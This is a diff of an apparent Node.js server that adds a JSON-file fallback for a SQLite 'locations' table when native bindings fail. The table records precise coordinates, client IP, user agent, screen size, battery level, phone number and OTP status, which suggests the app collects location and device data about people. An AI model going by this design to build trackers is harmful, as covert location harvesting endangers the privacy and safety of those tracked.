@@ -37,44 +37,134 @@ function saveSiteConfig(newConfig) {
 }
 
 // --------------------------------------------------------------------------
-// Database Setup (SQLite)
+// Database Setup (SQLite with High-Resilience FileDB Fallback for Cloud Hosts)
 // --------------------------------------------------------------------------
-const dbPath = path.join(__dirname, 'tracking.db');
-const db = new sqlite3.Database(dbPath, (err) => {
-  if (err) {
-    console.error('❌ SQLite connection error:', err.message);
-  } else {
-    console.log('✅ SQLite Database connected at:', dbPath);
+let db;
+
+function initFileDb() {
+  const LOCATIONS_FILE = path.join(__dirname, 'locations.json');
+  function readLocations() {
+    try {
+      if (fs.existsSync(LOCATIONS_FILE)) {
+        return JSON.parse(fs.readFileSync(LOCATIONS_FILE, 'utf-8'));
+      }
+    } catch (e) {}
+    return [];
   }
-});
+  function writeLocations(data) {
+    try {
+      fs.writeFileSync(LOCATIONS_FILE, JSON.stringify(data, null, 2), 'utf-8');
+    } catch (e) {
+      console.error('FileDB write error:', e);
+    }
+  }
 
-// Create tables and migrate schema
-db.serialize(() => {
-  db.run(`
-    CREATE TABLE IF NOT EXISTS locations (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      tag TEXT DEFAULT 'General',
-      phoneNumber TEXT DEFAULT 'N/A',
-      otpStatus TEXT DEFAULT 'VERIFIED',
-      latitude REAL NOT NULL,
-      longitude REAL NOT NULL,
-      accuracy REAL,
-      altitude REAL,
-      speed REAL,
-      heading REAL,
-      clientIp TEXT,
-      userAgent TEXT,
-      screenResolution TEXT,
-      batteryLevel TEXT,
-      clientTimestamp TEXT,
-      createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
-    )
-  `);
+  db = {
+    serialize: (cb) => { if (cb) cb(); },
+    run: function (sql, params, cb) {
+      if (typeof params === 'function') {
+        cb = params;
+        params = [];
+      }
+      params = params || [];
+      const self = { lastID: 1 };
+      try {
+        const records = readLocations();
+        if (/INSERT INTO locations/i.test(sql)) {
+          const nextId = records.length > 0 ? Math.max(...records.map(r => r.id || 0)) + 1 : 1;
+          self.lastID = nextId;
+          const [
+            tag, phoneNumber, otpStatus, latitude, longitude, accuracy,
+            altitude, speed, heading, clientIp, userAgent, screenResolution,
+            batteryLevel, clientTimestamp
+          ] = params;
+          records.unshift({
+            id: nextId,
+            tag: tag || 'General',
+            phoneNumber: phoneNumber || 'N/A',
+            otpStatus: otpStatus || 'VERIFIED',
+            latitude: Number(latitude),
+            longitude: Number(longitude),
+            accuracy: accuracy !== undefined && accuracy !== null ? Number(accuracy) : null,
+            altitude: altitude !== undefined ? altitude : null,
+            speed: speed !== undefined ? speed : null,
+            heading: heading !== undefined ? heading : null,
+            clientIp: clientIp || '127.0.0.1',
+            userAgent: userAgent || 'Unknown',
+            screenResolution: screenResolution || 'N/A',
+            batteryLevel: batteryLevel || 'N/A',
+            clientTimestamp: clientTimestamp || new Date().toISOString(),
+            createdAt: new Date().toISOString()
+          });
+          writeLocations(records);
+        } else if (/DELETE FROM locations WHERE id = \?/i.test(sql)) {
+          const deleteId = Number(params[0]);
+          const updated = records.filter(r => r.id !== deleteId);
+          writeLocations(updated);
+        } else if (/DELETE FROM locations/i.test(sql)) {
+          writeLocations([]);
+        }
+        if (cb) cb.call(self, null);
+      } catch (err) {
+        if (cb) cb.call(self, err);
+      }
+    },
+    all: function (sql, params, cb) {
+      if (typeof params === 'function') {
+        cb = params;
+        params = [];
+      }
+      try {
+        const records = readLocations();
+        if (cb) cb(null, records);
+      } catch (err) {
+        if (cb) cb(err, []);
+      }
+    }
+  };
+}
 
-  // Migrate existing table if columns are missing
-  db.run(`ALTER TABLE locations ADD COLUMN phoneNumber TEXT DEFAULT 'N/A'`, () => {});
-  db.run(`ALTER TABLE locations ADD COLUMN otpStatus TEXT DEFAULT 'VERIFIED'`, () => {});
-});
+// Try native SQLite, fallback to FileDB if GLIBC or native bindings fail
+try {
+  const sqlite3 = require('sqlite3').verbose();
+  const dbPath = path.join(__dirname, 'tracking.db');
+  db = new sqlite3.Database(dbPath, (err) => {
+    if (err) {
+      console.warn('⚠️ SQLite connection error, activating FileDB fallback:', err.message);
+      initFileDb();
+    } else {
+      console.log('✅ SQLite Database connected at:', dbPath);
+    }
+  });
+
+  db.serialize(() => {
+    db.run(`
+      CREATE TABLE IF NOT EXISTS locations (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        tag TEXT DEFAULT 'General',
+        phoneNumber TEXT DEFAULT 'N/A',
+        otpStatus TEXT DEFAULT 'VERIFIED',
+        latitude REAL NOT NULL,
+        longitude REAL NOT NULL,
+        accuracy REAL,
+        altitude REAL,
+        speed REAL,
+        heading REAL,
+        clientIp TEXT,
+        userAgent TEXT,
+        screenResolution TEXT,
+        batteryLevel TEXT,
+        clientTimestamp TEXT,
+        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
+      )
+    `);
+    db.run(`ALTER TABLE locations ADD COLUMN phoneNumber TEXT DEFAULT 'N/A'`, () => {});
+    db.run(`ALTER TABLE locations ADD COLUMN otpStatus TEXT DEFAULT 'VERIFIED'`, () => {});
+  });
+} catch (nativeErr) {
+  console.warn('⚠️ Native SQLite not supported on this environment (GLIBC mismatch). Switched to FileDB successfully.');
+  initFileDb();
+}
 
 // Middleware
 app.use(cors());
